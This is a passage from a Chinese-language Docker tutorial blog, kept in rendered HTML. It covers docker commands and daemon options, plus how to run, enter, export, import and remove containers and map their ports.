class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker   <span class="comment"># docker 命令帮助</span></span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">    attach    Attach to a running container                 <span class="comment"># 当前 shell 下 attach 连接指定运行镜像</span></span><br><span class="line">    build     Build an image from a Dockerfile              <span class="comment"># 通过 Dockerfile 定制镜像</span></span><br><span class="line">    <span class="keyword">commit</span>    <span class="keyword">Create</span> a <span class="keyword">new</span> image <span class="keyword">from</span> a <span class="keyword">container</span><span class="string">'s changes # 提交当前容器为新的镜像</span></span><br><span class="line"><span class="string">    cp        Copy files/folders from the containers filesystem to the host path</span></span><br><span class="line"><span class="string">              # 从容器中拷贝指定文件或者目录到宿主机中</span></span><br><span class="line"><span class="string">    create    Create a new container                        # 创建一个新的容器，同 run，但不启动容器</span></span><br><span class="line"><span class="string">    diff      Inspect changes on a container'</span>s filesystem   <span class="comment"># 查看 docker 容器变化</span></span><br><span class="line">    <span class="keyword">events</span>    <span class="keyword">Get</span> <span class="built_in">real</span> <span class="built_in">time</span> <span class="keyword">events</span> <span class="keyword">from</span> the <span class="keyword">server</span>          <span class="comment"># 从 docker 服务获取容器实时事件</span></span><br><span class="line">    exec      Run a command <span class="keyword">in</span> an existing <span class="keyword">container</span>        <span class="comment"># 在已存在的容器上运行命令</span></span><br><span class="line">    <span class="keyword">export</span>    Stream the <span class="keyword">contents</span> <span class="keyword">of</span> a <span class="keyword">container</span> <span class="keyword">as</span> a tar <span class="keyword">archive</span>   </span><br><span class="line">              <span class="comment"># 导出容器的内容流作为一个 tar 归档文件[对应 import ]</span></span><br><span class="line">    history   <span class="keyword">Show</span> the history <span class="keyword">of</span> an image                  <span class="comment"># 展示一个镜像形成历史</span></span><br><span class="line">    images    <span class="keyword">List</span> images                                   <span class="comment"># 列出系统当前镜像</span></span><br><span class="line">    <span class="keyword">import</span>    <span class="keyword">Create</span> a <span class="keyword">new</span> filesystem image <span class="keyword">from</span> the <span class="keyword">contents</span> <span class="keyword">of</span> a tarball  </span><br><span class="line">              <span class="comment"># 从tar包中的内容创建一个新的文件系统映像[对应 export]</span></span><br><span class="line">    info      Display <span class="keyword">system</span>-wide information               <span class="comment"># 显示系统相关信息</span></span><br><span class="line">    inspect   <span class="keyword">Return</span> <span class="keyword">low</span>-<span class="keyword">level</span> information <span class="keyword">on</span> a <span class="keyword">container</span>   <span class="comment"># 查看容器详细信息</span></span><br><span class="line">    <span class="keyword">kill</span>      <span class="keyword">Kill</span> a running <span class="keyword">container</span>                      <span class="comment"># kill 指定 docker 容器</span></span><br><span class="line">    <span class="keyword">load</span>      <span class="keyword">Load</span> an image <span class="keyword">from</span> a tar <span class="keyword">archive</span>              <span class="comment"># 从一个 tar 包中加载一个镜像[对应 save]</span></span><br><span class="line">    login     <span class="keyword">Register</span> <span class="keyword">or</span> Login <span class="keyword">to</span> the docker registry <span class="keyword">server</span>   </span><br><span class="line">              <span class="comment"># 注册或者登陆一个 docker 源服务器</span></span><br><span class="line">    logout    <span class="keyword">Log</span> <span class="keyword">out</span> <span class="keyword">from</span> a Docker registry <span class="keyword">server</span>         <span class="comment"># 从当前 Docker registry 退出</span></span><br><span class="line">    <span class="keyword">logs</span>      <span class="keyword">Fetch</span> the <span class="keyword">logs</span> <span class="keyword">of</span> a <span class="keyword">container</span>                 <span class="comment"># 输出当前容器日志信息</span></span><br><span class="line">    port      Lookup the <span class="keyword">public</span>-facing port which <span class="keyword">is</span> NAT-ed <span class="keyword">to</span> PRIVATE_PORT</span><br><span class="line">              <span class="comment"># 查看映射端口对应的容器内部源端口</span></span><br><span class="line">    pause     Pause <span class="keyword">all</span> processes <span class="keyword">within</span> a <span class="keyword">container</span>        <span class="comment"># 暂停容器</span></span><br><span class="line">    ps        <span class="keyword">List</span> containers                               <span class="comment"># 列出容器列表</span></span><br><span class="line">    pull      Pull an image <span class="keyword">or</span> a repository <span class="keyword">from</span> the docker registry <span class="keyword">server</span></span><br><span class="line">              <span class="comment"># 从docker镜像源服务器拉取指定镜像或者库镜像</span></span><br><span class="line">    push      Push an image <span class="keyword">or</span> a repository <span class="keyword">to</span> the docker registry <span class="keyword">server</span></span><br><span class="line">              <span class="comment"># 推送指定镜像或者库镜像至docker源服务器</span></span><br><span class="line">    restart   Restart a running <span class="keyword">container</span>                   <span class="comment"># 重启运行的容器</span></span><br><span class="line">    rm        Remove one <span class="keyword">or</span> more containers                 <span class="comment"># 移除一个或者多个容器</span></span><br><span class="line">    rmi       Remove one <span class="keyword">or</span> more images                 </span><br><span class="line">              <span class="comment"># 移除一个或多个镜像[无容器使用该镜像才可删除，否则需删除相关容器才可继续或 -f 强制删除]</span></span><br><span class="line">    run       Run a command <span class="keyword">in</span> a <span class="keyword">new</span> <span class="keyword">container</span></span><br><span class="line">              <span class="comment"># 创建一个新的容器并运行一个命令</span></span><br><span class="line">    <span class="keyword">save</span>      <span class="keyword">Save</span> an image <span class="keyword">to</span> a tar <span class="keyword">archive</span>                <span class="comment"># 保存一个镜像为一个 tar 包[对应 load]</span></span><br><span class="line">    <span class="keyword">search</span>    <span class="keyword">Search</span> <span class="keyword">for</span> an image <span class="keyword">on</span> the Docker Hub         <span class="comment"># 在 docker hub 中搜索镜像</span></span><br><span class="line">    <span class="keyword">start</span>     <span class="keyword">Start</span> a stopped containers                    <span class="comment"># 启动容器</span></span><br><span class="line">    <span class="keyword">stop</span>      <span class="keyword">Stop</span> a running containers                     <span class="comment"># 停止容器</span></span><br><span class="line">    tag       Tag an image <span class="keyword">into</span> a repository                <span class="comment"># 给源中镜像打标签</span></span><br><span class="line">    top       Lookup the running processes <span class="keyword">of</span> a <span class="keyword">container</span>   <span class="comment"># 查看容器中运行的进程信息</span></span><br><span class="line">    unpause   Unpause a paused <span class="keyword">container</span>                    <span class="comment"># 取消暂停容器</span></span><br><span class="line">    <span class="keyword">version</span>   <span class="keyword">Show</span> the docker <span class="keyword">version</span> information           <span class="comment"># 查看 docker 版本号</span></span><br><span class="line">    <span class="keyword">wait</span>      <span class="keyword">Block</span> <span class="keyword">until</span> a <span class="keyword">container</span> stops, <span class="keyword">then</span> print its <span class="keyword">exit</span> code   </span><br><span class="line">              <span class="comment"># 截取容器停止时的退出状态值</span></span><br><span class="line">Run <span class="string">'docker COMMAND --help'</span> <span class="keyword">for</span> more information <span class="keyword">on</span> a command.</span><br></pre></td></tr></table></figure><p>docker option</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Usage of docker:</span><br><span class="line">  --api-<span class="keyword">enable</span>-cors=false                <span class="keyword">Enable</span> CORS headers in the remote API                      <span class="meta"># 远程 API 中开启 CORS 头</span></span><br><span class="line">  -b, --bridge=<span class="string">""</span>                        Attach containers to a pre-existing network bridge         <span class="meta"># 桥接网络</span></span><br><span class="line">                                           <span class="keyword">use</span> 'none' to <span class="keyword">disable</span> container networking</span><br><span class="line">  --bip=<span class="string">""</span>                               <span class="keyword">Use</span> this CIDR notation address <span class="keyword">for</span> the network bridge's IP, not compatible with -b</span><br><span class="line">                                         # 和 -b 选项不兼容，具体没有测试过</span><br><span class="line">  -d, --daemon=false                     Enable daemon mode                                         # daemon 模式</span><br><span class="line">  -D, --debug=false                      Enable debug mode                                          # debug 模式</span><br><span class="line">  --dns=[]                               Force docker to use specific DNS servers                   # 强制 docker 使用指定 dns 服务器</span><br><span class="line">  --dns-search=[]                        Force Docker to use specific DNS search domains            # 强制 docker 使用指定 dns 搜索域</span><br><span class="line">  -e, --exec-driver="native"             Force the docker runtime to use a specific exec driver     # 强制 docker 运行时使用指定执行驱动器</span><br><span class="line">  --fixed-cidr=""                        IPv4 subnet <span class="keyword">for</span> fixed IPs (ex: <span class="number">10.20</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span>)</span><br><span class="line">                                           this subnet must be nested in the bridge subnet (which is defined by -b or --bip)</span><br><span class="line">  -G, --group="docker"                   Group to assign the unix socket specified by -H when running in daemon mode</span><br><span class="line">                                           use '' (the empty string) to disable setting of a group</span><br><span class="line">  -g, --graph="/var/lib/docker"          Path to use as the root of the docker runtime              # 容器运行的根目录路径</span><br><span class="line">  -H, --host=[]                          The socket(s) to bind to in daemon mode                    # daemon 模式下 docker 指定绑定方式[tcp or 本地 socket]</span><br><span class="line">                                           specified using one or more tcp://host:port, unix:///path/to/socket, fd:/<span class="comment">/* or fd://socketfd.</span></span><br><span class="line"><span class="comment">  --icc=true                             Enable inter-container communication                       # 跨容器通信</span></span><br><span class="line"><span class="comment">  --insecure-registry=[]                 Enable insecure communication with specified registries (no certificate verification for HTTPS and enable HTTP fallback) (e.g., localhost:5000 or 10.20.0.0/16)</span></span><br><span class="line"><span class="comment">  --ip="0.0.0.0"                         Default IP address to use when binding container ports     # 指定监听地址，默认所有 ip</span></span><br><span class="line"><span class="comment">  --ip-forward=true                      Enable net.ipv4.ip_forward                                 # 开启转发</span></span><br><span class="line"><span class="comment">  --ip-masq=true                         Enable IP masquerading for bridge's IP range</span></span><br><span class="line"><span class="comment">  --iptables=true                        Enable Docker's addition of iptables rules                 # 添加对应 iptables 规则</span></span><br><span class="line"><span class="comment">  --mtu=0                                Set the containers network MTU                             # 设置网络 mtu</span></span><br><span class="line"><span class="comment">                                           if no value is provided: default to the default route MTU or 1500 if no default route is available</span></span><br><span class="line"><span class="comment">  -p, --pidfile="/var/run/docker.pid"    Path to use for daemon PID file                            # 指定 pid 文件位置</span></span><br><span class="line"><span class="comment">  --registry-mirror=[]                   Specify a preferred Docker registry mirror                  </span></span><br><span class="line"><span class="comment">  -s, --storage-driver=""                Force the docker runtime to use a specific storage driver  # 强制 docker 运行时使用指定存储驱动</span></span><br><span class="line"><span class="comment">  --selinux-enabled=false                Enable selinux support                                     # 开启 selinux 支持</span></span><br><span class="line"><span class="comment">  --storage-opt=[]                       Set storage driver options                                 # 设置存储驱动选项</span></span><br><span class="line"><span class="comment">  --tls=false                            Use TLS; implied by tls-verify flags                       # 开启 tls</span></span><br><span class="line"><span class="comment">  --tlscacert="/root/.docker/ca.pem"     Trust only remotes providing a certificate signed by the CA given here</span></span><br><span class="line"><span class="comment">  --tlscert="/root/.docker/cert.pem"     Path to TLS certificate file                               # tls 证书文件位置</span></span><br><span class="line"><span class="comment">  --tlskey="/root/.docker/key.pem"       Path to TLS key file                                       # tls key 文件位置</span></span><br><span class="line"><span class="comment">  --tlsverify=false                      Use TLS and verify the remote (daemon: verify client, client: verify daemon) # 使用 tls 并确认远程控制主机</span></span><br><span class="line"><span class="comment">  -v, --version=false                    Print version information and quit                         # 输出 docker 版本信息</span></span><br></pre></td></tr></table></figure><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566366788030.png" alt></p><p>Docker 提供了一套简单实用的命令来创建和更新镜像，我们可以通过网络直接下载一个已经创建好了的应用镜像，并通过 Docker RUN 命令就可以直接使用。当镜像通过 RUN 命令运行成功后，这个运行的镜像就是一个 Docker 容器啦，容器可以理解为一个轻量级的沙箱， Docker 利用容器来运行和隔离应用，容器是可以被启动、停止、删除的，这并不会影响 Docker 镜像。</p><p>我们可以看看下面这幅图：</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566367311929.png" alt></p><h3 id="操作容器"><a href="#操作容器" class="headerlink" title="操作容器"></a>操作容器</h3><p><strong>启动容器</strong></p><p>启动容器有两种方式，一种是基于镜像新建一个容器并启动，另外一个是将在终止状态（stopped）的容器重新启动。</p><p>因为 Docker 的容器实在太轻量级了，很多时候用户都是随时删除和新创建容器。</p><p><strong>新建并启动</strong></p><p>所需要的命令主要为 <code>docker run</code>。</p><blockquote><p>docker build -t 是利用Dockerfile 构建镜像，这个时候可以使用 –name 来给自己的镜像命名;<br>docker run 是利用依据这个镜像构建容器，这个时候可以使用 –name 命名你的容器;<br>如果容器需要修改配置文件，我们可以选择挂载/挂载数据卷的方式，也可以直接COPY/ADD来覆盖</p></blockquote><p>例如，下面的命令输出一个 “Hello World”，之后终止容器。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker <span class="keyword">run</span><span class="bash"> --name wubantu ubuntu:18.04 /bin/<span class="built_in">echo</span> <span class="string">'Hello world'</span></span></span><br><span class="line">Hello world</span><br></pre></td></tr></table></figure><p>这跟在本地直接执行 <code>/bin/echo &#39;hello world&#39;</code> 几乎感觉不出任何区别。</p><p>下面的命令则启动一个 bash 终端，允许用户进行交互。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>docker run -t -i <span class="symbol">ubuntu:</span><span class="number">18.04</span> /bin/bash</span><br><span class="line">root<span class="variable">@af8bae53bdd3</span><span class="symbol">:/</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>其中，-t 选项让Docker分配一个伪终端（pseudo-tty）并绑定到容器的标准输入上， -i 则让容器的标准输入保持打开。</p><p>在交互模式下，用户可以通过所创建的终端来输入命令，例如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@af8bae53bdd3:/# pwd</span><br><span class="line">/</span><br><span class="line">root@af8bae53bdd3:/# ls</span><br><span class="line">bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure><p>当利用 docker run 来创建容器时，Docker 在后台运行的标准操作包括：</p><ul><li>检查本地是否存在指定的镜像，不存在就从公有仓库下载</li><li>利用镜像创建并启动一个容器</li><li>分配一个文件系统，并在只读的镜像层外面挂载一层可读写层</li><li>从宿主主机配置的网桥接口中桥接一个虚拟接口到容器中去</li><li>从地址池配置一个 ip 地址给容器</li><li>执行用户指定的应用程序</li><li>执行完毕后容器被终止</li></ul><p><strong>启动已终止容器</strong></p><p>可以利用 <code>docker container start</code> 命令，直接将一个已经终止的容器启动运行。</p><p>容器的核心为所执行的应用程序，所需要的资源都是应用程序运行所必需的。除此之外，并没有其它的资源。可以在伪终端中利用 ps 或 top 来查看进程信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ba267838cc1b:/# ps</span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line">    1 ?        00:00:00 bash</span><br><span class="line">   11 ?        00:00:00 ps</span><br></pre></td></tr></table></figure><p><strong>后台运行</strong></p><p>更多的时候，需要让 Docker 在后台运行而不是直接把执行命令的结果输出在当前宿主机下。此时，可以通过添加 <code>-d</code> 参数来实现。</p><p>下面举两个例子来说明一下。</p><p>如果不使用 <code>-d</code> 参数运行容器。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker <span class="keyword">run</span><span class="bash"> ubuntu:18.04 /bin/sh -c <span class="string">"while true; do echo hello world; sleep 1; done"</span></span></span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><p>容器会把输出的结果 (STDOUT) 打印到宿主机上面</p><p>如果使用了 -d 参数运行容器。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker <span class="keyword">run</span><span class="bash"> -d ubuntu:18.04 /bin/sh -c <span class="string">"while true; do echo hello world; sleep 1; done"</span></span></span><br><span class="line"><span class="number">77</span>b2dc01fe0f3f1265df143181e7b9af5e05279a884f4776ee75350ea9d8017a</span><br></pre></td></tr></table></figure><p>此时容器会在后台运行并不会把输出的结果 (STDOUT) 打印到宿主机上面(输出结果可以用 docker logs 查看)。</p><p><strong>注</strong>： 容器是否会长久运行，是和 docker run 指定的命令有关，和 -d 参数无关。</p><p>使用 <code>-d</code> 参数启动后会返回一个唯一的 id，也可以通过 <code>docker container ls</code> 命令来查看容器信息。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker container <span class="keyword">ls</span></span><br><span class="line">CONTAINER ID  IMAGE         COMMAND               CREATED        STATUS       PORTS NAMES</span><br><span class="line">77b2dc01fe0f  ubuntu:18.04  /bin/<span class="keyword">sh</span> -c '<span class="keyword">while</span> tr  2 minutes ago  Up 1 minute        agitated_wright</span><br></pre></td></tr></table></figure><p>要获取容器的输出信息，可以通过 <code>docker container logs</code> 命令。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> docker container logs [container ID <span class="keyword">or</span> NAMES]</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">. . .</span><br></pre></td></tr></table></figure><p><strong>终止容器</strong></p><p>可以使用 <code>docker container stop</code> 来终止一个运行中的容器。</p><p>此外，当 Docker 容器中指定的应用终结时，容器也自动终止。</p><p>终止状态的容器可以用 docker container ls -a 命令看到。例如</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker container <span class="keyword">ls</span> -a</span><br><span class="line">CONTAINER ID        IMAGE                    COMMAND                CREATED             STATUS                          PORTS               NAMES</span><br><span class="line">ba267838cc1b        ubuntu:18.04             <span class="string">"/bin/bash"</span>            30 minutes ago      Exited (0) <span class="keyword">About</span> a minute ago                       trusting_newton</span><br><span class="line">98e5efa7d997        training/webapp:latest   <span class="string">"python app.py"</span>        <span class="keyword">About</span> <span class="keyword">an</span> hour ago   Exited (0) 34 minutes ago                           backstabbing_pike</span><br></pre></td></tr></table></figure><p>处于终止状态的容器，可以通过 <code>docker container start</code> 命令来重新启动。</p><p>此外，<code>docker container restart</code> 命令会将一个运行态的容器终止，然后再重新启动它。</p><blockquote><p>好像也可以直接docker start/stop/restart ID</p></blockquote><p><strong>文件双向传输</strong></p><p>如果是容器传输文件到本地的话，反过来就好了：<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">cp</span> ID全称:容器文件路径 本地路径</span><br></pre></td></tr></table></figure></p><p><strong>好用的命令</strong></p><p>停止并删除所有的容器</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">stop</span> $(docker <span class="keyword">ps</span> -q) &amp; docker rm $(docker <span class="keyword">ps</span> -aq)</span><br></pre></td></tr></table></figure><p>删除所有的镜像</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure><p><strong>进入容器</strong></p><p>在使用 <code>-d</code> 参数时，容器启动后会进入后台。</p><p>某些时候需要进入容器进行操作，包括使用 <code>docker attach</code> 命令或 <code>docker exec</code> 命令，推荐大家使用 <code>docker exec</code> 命令，原因会在下面说明。</p><p><code>attach 命令</code></p><p>下面示例如何使用 docker attach 命令。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -dit ubuntu</span><br><span class="line"><span class="number">243</span><span class="keyword">c</span><span class="number">32535</span>da<span class="number">7</span>d<span class="number">142</span>fb<span class="number">0e6</span>df<span class="number">616</span>a<span class="number">3</span><span class="keyword">c</span><span class="number">3</span>ada<span class="number">0</span>b<span class="number">8</span>ab<span class="number">417937</span><span class="keyword">c</span><span class="number">853</span>a<span class="number">9e1</span><span class="keyword">c</span><span class="number">251</span>f<span class="number">499</span>f<span class="number">550</span></span><br><span class="line"></span><br><span class="line">$ docker container ls</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line"><span class="number">243</span><span class="keyword">c</span><span class="number">32535</span>da<span class="number">7</span>        ubuntu:latest       <span class="string">"/bin/bash"</span>         <span class="number">18</span> seconds ago      Up <span class="number">17</span> seconds                           nostalgic_hypatia</span><br><span class="line"></span><br><span class="line">$ docker attach <span class="number">243</span><span class="keyword">c</span></span><br><span class="line">root<span class="title">@243</span><span class="keyword">c</span><span class="number">32535</span>da<span class="number">7</span>:/#</span><br></pre></td></tr></table></figure><blockquote><p>注意： 如果从这个 stdin 中 exit，会导致容器的停止。</p></blockquote><p><code>exec 命令</code></p><p>docker exec 后边可以跟多个参数，这里主要说明 -i -t 参数。</p><p>只用 -i 参数时，由于没有分配伪终端，界面没有我们熟悉的 Linux 命令提示符，但命令执行结果仍然可以返回。</p><p>当 <code>-i -t</code> 参数一起使用时，则可以看到我们熟悉的 Linux 命令提示符。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run -dit ubuntu</span></span><br><span class="line">69d137adef7a8a689cbcb059e94da5489d3cddd240ff675c640c8d96e84fe1f6</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker container ls</span></span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line">69d137adef7a        ubuntu:latest       "/bin/bash"         18 seconds ago      Up 17 seconds                           zealous_swirles</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker <span class="built_in">exec</span> -i 69d1 bash</span></span><br><span class="line">ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker <span class="built_in">exec</span> -it 69d1 bash</span></span><br><span class="line">root@69d137adef7a:/#</span><br></pre></td></tr></table></figure><blockquote><p>如果从这个 stdin 中 exit，不会导致容器的停止。这就是为什么推荐大家使用 docker exec 的原因。</p></blockquote><p><em>更多参数说明请使用 docker exec –help 查看。</em></p><p><strong>导出和导入容器</strong></p><p>如果要导出本地某个容器，可以使用 <code>docker export</code> 命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker container ls -a</span></span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                    PORTS               NAMES</span><br><span class="line">7691a814370e        ubuntu:18.04        "/bin/bash"         36 hours ago        Exited (0) 21 hours ago                       test</span><br><span class="line"><span class="meta">$</span><span class="bash"> docker <span class="built_in">export</span> 7691a814370e &gt; ubuntu.tar</span></span><br></pre></td></tr></table></figure><p>这样将导出容器快照到本地文件。</p><p>可以使用 <code>docker import</code> 从容器快照文件中再导入为镜像，例如</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">cat</span> ubuntu.tar | docker import - <span class="keyword">test</span>/ubuntu:v1.0</span><br><span class="line">$ docker image <span class="keyword">ls</span></span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED              VIRTUAL SIZE</span><br><span class="line"><span class="keyword">test</span>/ubuntu         v1.0                9d37a6082e97        <span class="keyword">About</span> a minute ago   171.3 MB</span><br></pre></td></tr></table></figure><p>此外，也可以通过指定 URL 或者某个目录来导入，例如</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker <span class="keyword">import</span> <span class="string">http:</span><span class="comment">//example.com/exampleimage.tgz example/imagerepo</span></span><br></pre></td></tr></table></figure><blockquote><p>注：用户既可以使用 docker load 来导入镜像存储文件到本地镜像库，也可以使用 docker import 来导入一个容器快照到本地镜像库。这两者的区别在于容器快照文件将丢弃所有的历史记录和元数据信息（即仅保存容器当时的快照状态），而镜像存储文件将保存完整记录，体积也要大。此外，从容器快照文件导入时可以重新指定标签等元数据信息。</p></blockquote><p><strong>删除容器</strong></p><p>可以使用 docker container rm 来删除一个处于终止状态的容器。例如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker container rm  trusting_newton</span></span><br><span class="line">trusting_newton</span><br></pre></td></tr></table></figure><p>如果要删除一个运行中的容器，可以添加 -f 参数。Docker 会发送 SIGKILL 信号给容器。</p><p>清理所有处于终止状态的容器</p><p>用 <code>docker container ls -a</code> 命令可以查看所有已经创建的包括终止状态的容器，如果数量太多要一个个删除可能会很麻烦，用下面的命令可以清理掉所有处于终止状态的容器。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker container prune</span></span><br></pre></td></tr></table></figure><h3 id="使用网络"><a href="#使用网络" class="headerlink" title="使用网络"></a>使用网络</h3><p><strong>外部访问容器</strong></p><p>容器中可以运行一些网络应用，要让外部也可以访问这些应用，可以通过 <code>-P</code> 或 <code>-p</code> 参数来指定端口映射。</p><p>当使用 -P 标记时，Docker 会随机映射一个 49000~49900 的端口到内部容器开放的网络端口。</p><p>使用 docker container ls 可以看到，本地主机的 49155 被映射到了容器的 5000 端口。此时访问本机的 49155 端口即可访问容器内 web 应用提供的界面。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -P training/webapp python app.py</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker container ls -l</span></span><br><span class="line">CONTAINER ID  IMAGE                   COMMAND       CREATED        STATUS        PORTS                    NAMES</span><br><span class="line">bc533791f3f5  training/webapp:latest  python app.py 5 seconds ago  Up 2 seconds  0.0.0.0:49155-&gt;5000/tcp  nostalgic_morse</span><br></pre></td></tr></table></figure><p>同样的，可以通过 <code>docker logs</code> 命令来查看应用的信息。</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker logs -f nostalgic_morse</span><br><span class="line">* Running on http://<span class="number">0.0.0.0:5000</span>/</span><br><span class="line"><span class="number">10.0.2.2</span> - - <span class="string">[23/May/2014 20:16:31]</span> <span class="string">"<span class="keyword">GET</span> / HTTP/1.1"</span> <span class="number">200</span> -</span><br><span class="line"><span class="number">10.0.2.2</span> - - <span class="string">[23/May/2014 20:16:31]</span> <span class="string">"<span class="keyword">GET</span> /favicon.ico HTTP/1.1"</span> <span class="number">404</span> -</span><br></pre></td></tr></table></figure><p><code>-p</code> 则可以指定要映射的端口，并且，在一个指定端口上只可以绑定一个容器。支持的格式有 <code>ip:hostPort:containerPort | ip::containerPort | hostPort:containerPort</code>。</p><p><strong>映射所有接口地址</strong></p><p>使用 hostPort:containerPort 格式本地的 5000 端口映射到容器的 5000 端口，可以执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -p 5000:5000 training/webapp python 